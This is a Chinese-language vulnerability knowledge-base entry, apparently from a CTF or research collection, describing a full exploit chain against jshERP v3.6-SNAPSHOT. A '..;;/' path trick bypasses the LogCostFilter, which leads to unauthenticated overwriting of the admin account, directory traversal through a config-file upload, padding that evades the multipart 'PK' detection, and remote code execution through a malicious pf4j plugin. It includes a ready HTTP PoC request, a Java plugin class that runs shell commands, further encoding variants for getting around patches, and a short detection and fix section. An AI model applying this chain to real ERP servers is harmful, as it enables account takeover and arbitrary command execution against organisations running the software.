---
id: web-java-component-jsherp-filter-prefix-normalization-plugin-rce
title: jshERP v3.6 补丁绕过：原始 URI 前缀白名单 + Tomcat 分号路径参数归一化差异，未授权建管理员后 pf4j 插件 RCE
type: scenario
domain: web
path: web/java/component/tomcat
technique: jsherp-raw-uri-prefix-normalization-plugin-rce
aliases:
- jshERP v3.6 补丁绕过
- LogCostFilter 绕过
- ..;; 路径穿越
- 分号路径参数归一化差异
- jshERP pf4j 插件 RCE
- uploadPluginConfigFile 目录穿越
- 未授权 admin 建号
tags:
- java
- jsherp
- tomcat
- path-normalization
- path-parameter
- filter-bypass
- pf4j
- plugin-upload
- unauthenticated
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: jshERP v3.6-SNAPSHOT（原文称补丁后仍可绕过）
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:08+08:00'
  notes: 对照 Web Auto-3：v3.6-SNAPSHOT、原始 URI 前缀白名单、..;; 归一化、md5(123456) 建号、pf4j startEvent RCE 一致；未复跑
---

## 一句话结论

jshERP v3.6-SNAPSHOT 的 `LogCostFilter` 用原始 `requestURI` 做前缀白名单并只拦 `../`、`..;/`，但 Tomcat 在路由前会剥离分号路径参数再做 `..` 归一化；用 `..;;/` 既落在静态资源白名单前缀内、又不含被拦子串，归一化后穿越到 `/jshERP-boot/user/add`，配合未授权建管理员与 pf4j 插件上传即可在目标上执行任意命令。

## 原理

- **检查与路由看的不是同一个路径**：`LogCostFilter` 直接读取原始 `requestURI`，用 `startsWith` 判断是否落在白名单前缀（如 `/jshERP-boot/systemConfig/static`），并用 `contains("../")`、`contains("..;/")` 拦截穿越。Tomcat 则在 mapping 前按 RFC 7230 把分号后的内容当作 path parameter 丢弃，然后才做 `.`/`..` 路径归一化。
- **差异载荷**：`/jshERP-boot/systemConfig/static/..;;/..;;/user/add`
  - 过滤器视角：以白名单前缀开头，整串只有 `..;;`，不含 `../` 也不含 `..;/`，放行；
  - Tomcat 视角：剥掉 `;;` 后两个 `..` 生效，逐级上跳到上下文根，最终路由到 `/jshERP-boot/user/add`。
  一个前缀穿越同时骗过了“前缀白名单”和“字符黑名单”。
- **未授权建号的两个补丁遗漏**：`UserService.insertUser` 不校验调用方身份；忽略请求体中的密码，固定写入 `md5("123456")`；`/user/add` 不拒绝 `loginName=admin`；插件接口的管理员判断只看登录名是否为 `admin`。因此直接 `POST {"loginName":"admin","username":"admin","tenantId":0}` 即可创建/覆盖管理员，再用 `md5("123456")` 登录拿到 token。
- **插件 RCE**：jshERP 使用 pf4j 加载插件。`DefaultPluginFactory.create` 会检查插件类 `isAssignableFrom(org.pf4j.Plugin)`，所以类必须继承 `org.pf4j.Plugin`（通常继承 `BasePlugin`）。`BasePlugin.start()` 是 `final`，但内部回调虚方法 `startEvent()`，重写它即可在插件启动时执行代码，不依赖 Controller 路由。描述符由 `ManifestPluginDescriptorFinder` 读取，`MANIFEST.MF` 与 `plugin.properties` 都必须写全 `Plugin-Id`、`Plugin-Class`、`Plugin-Version` 等属性。
- **上传前置**：`plugins` 目录必须先存在。用 `/plugin/uploadPluginConfigFile` 的文件名 `../plugins/seed.txt` 做目录穿越创建目录/占位文件。部分环境对 multipart 做内容型拦截（请求体出现 `PK` 魔数即重置连接），可在 `file` 字段前插入一个 8000 字节全 `A` 的 `pad` 字段，把敏感前缀冲淡到检测窗口之外。

## 触发条件

- jshERP v3.6-SNAPSHOT 或带有相同 `LogCostFilter` 实现的版本；Tomcat 对分号路径参数的处理与过滤器读取原始 URI 的时序差异存在。
- 静态资源白名单前缀可通过 `..;;/` 穿越到目标接口；目标接口（`/user/add`、插件上传/启停）本身不做二次鉴权。
- pf4j 插件目录可写，且插件加载/启动可由攻击者触发（上传后重启或调用启用接口）。
- 上传通道允许 multipart；若存在 `PK` 等内容检测，需要填充字段稀释。

## 利用步骤

1. 用 `..;;/` 前缀穿越访问 `/jshERP-boot/user/add`，确认过滤器放行且路由命中。
2. 提交 `{"loginName":"admin","username":"admin","tenantId":0}` 创建/覆盖管理员；用 `md5("123456")` 登录，拿到 `X-Access-Token`。
3. 调用 `/plugin/uploadPluginConfigFile`，文件名用 `../plugins/seed.txt` 穿越，确保 `plugins` 目录存在。
4. 打包插件 JAR：`MANIFEST.MF` 与 `plugin.properties` 写入 `Plugin-Id`、`Plugin-Class`、`Plugin-Version`；插件类继承 `BasePlugin` 并重写 `startEvent()`，在其中执行命令并把输出写到 Web 可读路径。
5. multipart 上传插件，`file` 前加 8000 字节 `A` 的 `pad` 字段绕过 `PK` 内容检测；上传后触发插件加载/启用。
6. 访问静态白名单下的输出文件（如 `/jshERP-boot/systemConfig/static/../../upload/o.txt` 或直接 `/upload/o.txt`）读取命令结果。

## PoC

```text
POST /jshERP-boot/systemConfig/static/..;;/..;;/user/add HTTP/1.1
Host: target
Content-Type: application/json

{"loginName":"admin","username":"admin","tenantId":0}
```

```java
// 插件类：继承 BasePlugin，重写 startEvent()
import org.pf4j.BasePlugin;

public class P2Plugin extends BasePlugin {
    @Override
    protected void startEvent() {
        try {
            String out = exec("cat /flag /flag.txt 2>/dev/null; id; find / -maxdepth 4 -iname '*flag*'");
            java.nio.file.Files.write(
                java.nio.file.Paths.get("/opt/jshERP/upload/o.txt"),
                out.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        } catch (Exception ignored) {}
    }
}
```

```text
# MANIFEST.MF / plugin.properties 关键项
Plugin-Id: p2
Plugin-Class: P2Plugin
Plugin-Version: 1.0.0
```

## 变体与关联

- 变体：分号路径参数可换成 `..;/`、`..%3b/`、`..%253b/` 等等价形态，取决于容器与过滤器解码层次；路径参数也可插在中间段制造更多前缀匹配。
- 变体：若 `..;;` 被新补丁拦截，可尝试大小写、双重编码、`;` 与 `/` 的混合、矩阵参数（`;x=y`）等归一化差异。
- 关联：[[web-generic-sqli-jsherp-orderby-extractvalue-loadfile]]（同产品未授权 SQLi 链）、[[web-generic-auth-xiahuia-erp-logcostfilter-contains-path-bypass]]（同源代码系的 LogCostFilter contains 白名单绕过，本文是其 v3.6 前缀白名单 + `..;;` 变体）、[[web-java-component-fastcms-plugin-upload-pf4j-start-rce]]（pf4j 插件 `startEvent` RCE 的同类实现）、[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（自定义鉴权路径解析差异）。
- 边界：Tomcat 版本/配置（`allowEncodedSlash`、`rejectIllegalHeader` 等）会影响分号处理；插件加载需要目录可写与重启/启用动作；输出文件路径需可访问。

## 检测与防御

- 检测：请求 URI 中出现 `..;;`、`;` 路径参数与白名单静态前缀组合；同一 IP 先访问静态前缀再命中管理接口；未授权 `POST /user/add`、`loginName=admin`；插件目录出现非预期 JAR 或 `seed.txt` 类占位文件。
- 修复：过滤器不要直接信任原始 `requestURI`，应使用容器归一化后的路径或自建规范化函数；对 `;`、`..`、编码后的点/斜杠统一拒绝；`/user/add` 加认证并禁止创建 `admin`；`insertUser` 服务端强制角色、密码与租户。
- 加固：插件上传加签名校验、白名单与人工审核；插件目录不可由 Web 写入；上传内容检测覆盖 `PK` 前填充；最小权限运行，flag/敏感文件不可被 Web 进程读取。
